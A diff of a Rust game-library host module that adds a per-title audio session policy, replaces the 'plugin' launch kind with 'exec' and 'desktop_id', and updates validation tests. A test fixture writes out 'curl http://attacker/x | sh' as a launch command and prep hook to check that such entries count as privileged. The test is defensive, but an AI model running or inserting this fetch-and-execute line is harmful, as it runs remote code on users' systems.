@@ -47,8 +47,24 @@ pub struct CustomEntry {
     /// Absent follows the host's display policy.
     #[serde(default, skip_serializing_if = "OnWindow::is_empty")]
     pub on_window: OnWindow,
+    /// Which sessions hear this title. Absent = every session.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub audio: Option<AudioPolicy>,
     #[serde(flatten)]
     pub meta: GameMeta,
+}
+
+/// Audio while this title runs: which of the sessions on its display hear it.
+/// `all` is the same as no policy and is stored as none.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize, Deserialize, ToSchema)]
+pub struct AudioPolicy {
+    #[serde(default)]
+    pub sessions: crate::session_status::AudioSessions,
+}
+
+/// `all` means no policy: stored as none so the row and the wire stay bare.
+fn audio_policy(audio: Option<AudioPolicy>) -> Option<AudioPolicy> {
+    audio.filter(|a| a.sessions != crate::session_status::AudioSessions::All)
 }
 
 /// Create/replace body. No `id` — the host assigns it.
@@ -75,6 +91,9 @@ pub struct CustomInput {
     /// Absent on an update keeps the stored placement, as with `prep`.
     #[serde(default)]
     pub on_window: Option<OnWindow>,
+    /// Absent on an update keeps the stored policy; `{"sessions":"all"}` clears it.
+    #[serde(default)]
+    pub audio: Option<AudioPolicy>,
     /// Flattened [`GameMeta`]. Replaced wholesale on update — an edit must send every field it wants kept.
     #[serde(flatten)]
     pub meta: GameMeta,
@@ -104,6 +123,8 @@ pub struct ProviderEntryInput {
     /// Which workspace the title opens on; absent follows the host's display policy.
     #[serde(default)]
     pub on_window: OnWindow,
+    #[serde(default)]
+    pub audio: Option<AudioPolicy>,
     #[serde(flatten)]
     pub meta: GameMeta,
 }
@@ -296,6 +317,7 @@ pub fn add_custom(input: CustomInput) -> Result<CustomEntry> {
         icon: input.icon,
         detect: input.detect.unwrap_or_default(),
         on_window: input.on_window.unwrap_or_default(),
+        audio: audio_policy(input.audio),
         meta: input.meta,
     };
     catalog.entries.push(entry.clone());
@@ -327,6 +349,9 @@ pub fn update_custom(id: &str, input: CustomInput) -> Result<MutateOutcome<Custo
     }
     if let Some(on_window) = input.on_window {
         slot.on_window = on_window;
+    }
+    if input.audio.is_some() {
+        slot.audio = audio_policy(input.audio);
     }
     slot.meta = input.meta;
     let updated = slot.clone();
@@ -367,8 +392,8 @@ pub fn privileged_field(
 }
 
 /// Launch kinds any lane may publish: the host builds the command from a validated value,
-/// so the entry names a title rather than carrying a program. `plugin` stores no command —
-/// the host asks the live plugin at launch ([`crate::library::ask_plugin_launch`]).
+/// so the entry names a title rather than carrying a program. `exec` names a template in the
+/// publishing plugin's manifest, which the host resolves ([`crate::library::exec`]).
 /// Fail closed: a kind added to `launch.rs` and forgotten here is operator-only.
 /// `gog` is listed because `launch::gog_spawn` confines the exe to a GOG install;
 /// `command` is never listed (`cmd.exe /c` / `sh -c`).
@@ -386,7 +411,8 @@ const UNPRIVILEGED_LAUNCH_KINDS: &[&str] = &[
     "uplay",
     "amazon",
     "battlenet",
-    "plugin",
+    "exec",
+    "desktop_id",
 ];
 
 /// Path segment / event source / console label. `manual` is reserved (the no-provider sentinel
@@ -445,7 +471,10 @@ pub fn sanitize_launcher_entries(inputs: &mut Vec<ProviderEntryInput>) -> Vec<(S
 
 /// Non-empty titles and unique, non-empty `external_id`s. A duplicate would make ownership of
 /// the surviving row ambiguous.
-pub fn validate_provider_payload(inputs: &[ProviderEntryInput]) -> Result<(), String> {
+pub fn validate_provider_payload(
+    provider: &str,
+    inputs: &[ProviderEntryInput],
+) -> Result<(), String> {
     let mut seen = std::collections::HashSet::new();
     for (i, e) in inputs.iter().enumerate() {
         if e.external_id.trim().is_empty() {
@@ -508,13 +537,18 @@ pub fn validate_provider_payload(inputs: &[ProviderEntryInput]) -> Result<(), St
                      of [A-Za-z0-9_]"
                 ));
             }
-            // Opaque key in the owning plugin's namespace, handed back at launch
-            // ([`crate::library::ask_plugin_launch`]). Host never parses it; keep it loggable.
-            if launch.kind == "plugin" && !valid_plugin_entry_key(&launch.value) {
+            #[cfg(not(windows))]
+            if launch.kind == "desktop_id" && !crate::library::valid_desktop_id(&launch.value) {
                 return Err(format!(
-                    "entries[{i}]: `launch.value` for kind `plugin` must be 1–512 chars with no \
-                     control characters"
+                    "entries[{i}]: `launch.value` for kind `desktop_id` must be a desktop entry id"
                 ));
+            }
+            // A template name in the publishing plugin's manifest, with its arguments. Resolved
+            // here so a bad entry is refused at publish time rather than at launch.
+            if launch.kind == "exec" {
+                if let Err(reason) = crate::library::exec_spec_is_publishable(provider, launch) {
+                    return Err(format!("entries[{i}]: `launch` for kind `exec` {reason}"));
+                }
             }
         }
         if let Some(marker) = &e.detect.env_marker {
@@ -571,6 +605,7 @@ fn reconcile_entries(
             icon: input.icon,
             detect: input.detect,
             on_window: input.on_window,
+            audio: audio_policy(input.audio),
             meta: input.meta,
         });
     }
@@ -654,6 +689,13 @@ pub fn prep_for(library_id: &str) -> Vec<crate::hooks::PrepCmd> {
         .unwrap_or_default()
 }
 
+/// The title's `audio.sessions`, if it has one. Same lookup as [`prep_for`].
+pub fn audio_sessions_for(library_id: &str) -> Option<crate::session_status::AudioSessions> {
+    entry_for_library_id(library_id)
+        .and_then(|e| e.audio)
+        .map(|a| a.sessions)
+}
+
 /// `source` is `"manual"` for operator CRUD, else the provider id. Hooks and the SDK filter on it.
 fn emit_changed(source: &str) {
     crate::events::emit(crate::events::EventKind::LibraryChanged {
@@ -664,6 +706,38 @@ fn emit_changed(source: &str) {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// `audio.sessions` round-trips on the row; `all` and absent are the same bare row.
+    #[test]
+    fn audio_policy_is_bare_unless_it_narrows() {
+        use crate::session_status::AudioSessions;
+        let input = |json: &str| serde_json::from_str::<CustomInput>(json).unwrap();
+        assert_eq!(audio_policy(input(r#"{"title":"x"}"#).audio), None);
+        assert_eq!(
+            audio_policy(input(r#"{"title":"x","audio":{"sessions":"all"}}"#).audio),
+            None
+        );
+        let owner = input(r#"{"title":"x","audio":{"sessions":"owner"}}"#);
+        assert_eq!(
+            audio_policy(owner.audio).map(|a| a.sessions),
+            Some(AudioSessions::Owner)
+        );
+        assert!(serde_json::from_str::<CustomInput>(
+            r#"{"title":"x","audio":{"sessions":"phone"}}"#
+        )
+        .is_err());
+        let mut row = manual("c1", "x");
+        row.audio = audio_policy(owner.audio);
+        let json = serde_json::to_value(&row).unwrap();
+        assert_eq!(json["audio"]["sessions"], "owner");
+        let back: CustomEntry = serde_json::from_value(json).unwrap();
+        assert_eq!(back.audio, row.audio);
+        assert!(!serde_json::to_value(manual("c2", "y"))
+            .unwrap()
+            .as_object()
+            .unwrap()
+            .contains_key("audio"));
+    }
 
     fn manual(id: &str, title: &str) -> CustomEntry {
         CustomEntry {
@@ -679,6 +753,7 @@ mod tests {
             icon: None,
             detect: DetectHint::default(),
             on_window: OnWindow::default(),
+            audio: None,
             meta: GameMeta::default(),
         }
     }
@@ -694,6 +769,7 @@ mod tests {
             icon: None,
             detect: DetectHint::default(),
             on_window: OnWindow::default(),
+            audio: None,
             meta: GameMeta::default(),
         }
     }
@@ -786,6 +862,7 @@ mod tests {
         launcher.launch = Some(LaunchSpec {
             kind: "launcher_ui".into(),
             value: "lutris".into(),
+            ..Default::default()
         });
 
         let mut entries = Vec::new();
@@ -1016,22 +1093,29 @@ mod tests {
             i.launch = Some(LaunchSpec {
                 kind: kind.into(),
                 value: value.into(),
+                ..Default::default()
             });
             i
         };
-        assert!(validate_provider_payload(&[with_launch("steam_ui", "bigpicture")]).is_ok());
-        assert!(validate_provider_payload(&[with_launch("steam_ui", "desktop")]).is_ok());
-        assert!(validate_provider_payload(&[with_launch("steam_ui", "gamepad")]).is_err());
-        assert!(validate_provider_payload(&[with_launch("steam_ui", "")]).is_err());
+        assert!(
+            validate_provider_payload("demo", &[with_launch("steam_ui", "bigpicture")]).is_ok()
+        );
+        assert!(validate_provider_payload("demo", &[with_launch("steam_ui", "desktop")]).is_ok());
+        assert!(validate_provider_payload("demo", &[with_launch("steam_ui", "gamepad")]).is_err());
+        assert!(validate_provider_payload("demo", &[with_launch("steam_ui", "")]).is_err());
         // Other kinds are unconstrained here (validated per-kind at launch).
-        assert!(validate_provider_payload(&[with_launch("command", "anything")]).is_ok());
+        assert!(validate_provider_payload("demo", &[with_launch("command", "anything")]).is_ok());
 
         // `launcher_ui`: unknown names 400 here. Not-installed is dropped later, not 400.
-        assert!(validate_provider_payload(&[with_launch("launcher_ui", "nonesuch")]).is_err());
+        assert!(
+            validate_provider_payload("demo", &[with_launch("launcher_ui", "nonesuch")]).is_err()
+        );
         #[cfg(windows)]
-        assert!(validate_provider_payload(&[with_launch("launcher_ui", "playnite")]).is_ok());
+        assert!(
+            validate_provider_payload("demo", &[with_launch("launcher_ui", "playnite")]).is_ok()
+        );
         #[cfg(target_os = "linux")]
-        assert!(validate_provider_payload(&[with_launch("launcher_ui", "lutris")]).is_ok());
+        assert!(validate_provider_payload("demo", &[with_launch("launcher_ui", "lutris")]).is_ok());
 
         let with_env = |key: &str, value: Option<&str>| {
             let mut i = input("a", "A");
@@ -1041,13 +1125,17 @@ mod tests {
             });
             i
         };
-        assert!(validate_provider_payload(&[with_env("HEROIC_APP_NAME", Some("Quail"))]).is_ok());
-        assert!(validate_provider_payload(&[with_env("BAD-KEY", None)]).is_err());
-        assert!(validate_provider_payload(&[with_env("", None)]).is_err());
         assert!(
-            validate_provider_payload(&[with_env("K", Some(&"x".repeat(MAX_ENV_VALUE + 1)))])
-                .is_err()
+            validate_provider_payload("demo", &[with_env("HEROIC_APP_NAME", Some("Quail"))])
+                .is_ok()
         );
+        assert!(validate_provider_payload("demo", &[with_env("BAD-KEY", None)]).is_err());
+        assert!(validate_provider_payload("demo", &[with_env("", None)]).is_err());
+        assert!(validate_provider_payload(
+            "demo",
+            &[with_env("K", Some(&"x".repeat(MAX_ENV_VALUE + 1)))]
+        )
+        .is_err());
     }
 
     #[test]
@@ -1055,10 +1143,12 @@ mod tests {
         let cmd = LaunchSpec {
             kind: "command".into(),
             value: "curl http://attacker/x | sh".into(),
+            ..Default::default()
         };
         let steam = LaunchSpec {
             kind: "steam_appid".into(),
             value: "70".into(),
+            ..Default::default()
         };
         let prep = vec![crate::hooks::PrepCmd {
             run: "curl http://attacker/x | sh".into(),
@@ -1080,6 +1170,7 @@ mod tests {
             let spec = LaunchSpec {
                 kind: k.into(),
                 value: "x".into(),
+                ..Default::default()
             };
             privileged_field(Some(&spec), &[])
         };
@@ -1099,7 +1190,8 @@ mod tests {
                 "uplay",
                 "amazon",
                 "battlenet",
-                "plugin",
+                "exec",
+                "desktop_id",
             ],
             "widening this set hands the plugin lane a new launch kind — do it on purpose"
         );
@@ -1122,11 +1214,11 @@ mod tests {
         assert!(validate_provider_name("-lead").is_err());
         assert!(validate_provider_name(&"x".repeat(65)).is_err());
 
-        assert!(validate_provider_payload(&[input("a", "A")]).is_ok());
-        assert!(validate_provider_payload(&[input("", "A")]).is_err());
-        assert!(validate_provider_payload(&[input("a", " ")]).is_err());
+        assert!(validate_provider_payload("demo", &[input("a", "A")]).is_ok());
+        assert!(validate_provider_payload("demo", &[input("", "A")]).is_err());
+        assert!(validate_provider_payload("demo", &[input("a", " ")]).is_err());
         assert!(
-            validate_provider_payload(&[input("a", "A"), input("a", "B")]).is_err(),
+            validate_provider_payload("demo", &[input("a", "A"), input("a", "B")]).is_err(),
             "duplicate external_id"
         );
     }
@@ -1138,6 +1230,7 @@ mod tests {
         tile.launch = Some(LaunchSpec {
             kind: "launcher_ui".into(),
             value: "playnite".into(),
+            ..Default::default()
         });
 
         let mut inputs = vec![input("a", "A"), tile, input("b", "B")];
